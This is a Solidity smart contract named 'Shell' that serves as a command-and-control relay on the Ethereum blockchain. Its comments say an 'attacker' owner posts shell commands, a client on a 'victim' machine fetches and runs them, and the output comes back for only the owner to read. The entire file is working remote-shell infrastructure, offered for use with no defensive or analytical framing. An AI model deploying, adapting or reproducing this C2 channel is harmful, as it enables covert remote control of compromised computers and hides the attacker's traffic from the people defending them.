// SPDX-License-Identifier: UNLICENCED
pragma solidity ^0.6.0;

contract Shell {
    uint256 isCommandReady;
    uint256 isOutputReady;
    address owner;
    string command = "";
    string output = "";

    // constractor() gets called when the contract deploys.
    constructor() public {
        owner = msg.sender;
        isCommandReady = 1; // isCommandReady is true so the client will push his shell output first and then the attacker will be able to start sending commands.
        isOutputReady = 0; // isOutputReady is false so the attacker wont be able to send commands before a victim connects.
    }

    modifier OwnerOnly() {
        require(msg.sender == owner, "Only owner can withdraw the money.");
        _;
    }

    // SetCommand() gets a string and put it in "command" variable, for the client to run.
    // SetCommand() can only be called by owner.
    function SetCommand(string memory command_) public OwnerOnly {
        command = command_;
        //isCommandReady = true;
    }

    // Reset() resets all of the variables so the shell can start to function properly (after a previous run of the program).
    // Reset() can only be called by owner.
    function Reset() public OwnerOnly {
        command = "";
        output = "";
        isCommandReady = 1; // isCommandReady is true so the client will push his shell output first and then the attacker will be able to start sending commands.
        isOutputReady = 0; // isOutputReady is false so the attacker wont be able to send commands before a victim connects.
    }

    // GetCommand() return the command requested (by the attacker) to the client.
    function GetCommand() public view returns (string memory) {
        //isCommandReady = false;
        return command;
    }

    // AddOutput() gets a string and adds it to "output" variable, for the attacker to read from.
    function AddOutput(string memory output_) public {
        output = string(abi.encodePacked(output, output_));
        //isOutputReady = true;
    }

    // SetOutput() gets a string and puts it "output" variable.
    function SetOutput(string memory output_) public {
        output = output_;
        //isOutputReady = true;
    }

    // GetOutput() return the command output.
    // GetOutput can only be called by owner.
    function GetOutput() public view OwnerOnly returns (string memory) {
        //isOutputReady = false;
        return output;
    }

    // GetisCommandReady returns isOutputReady.
    function GetisCommandReady() public view returns (uint256) {
        return isCommandReady;
    }

    // SetisCommandReady gets a bool and sets isCommandReady.
    function SetisCommandReady(uint256 isCommandReady_) public {
        isCommandReady = isCommandReady_;
    }

    // GetisOutputReady returns isOutputReady.
    function GetisOutputReady() public view OwnerOnly returns (uint256) {
        return isOutputReady;
    }

    // SetisOutputReady gets a bool and sets isOutputReady.
    function SetisOutputReady(uint256 isOutputReady_) public {
        isOutputReady = isOutputReady_;
    }
}
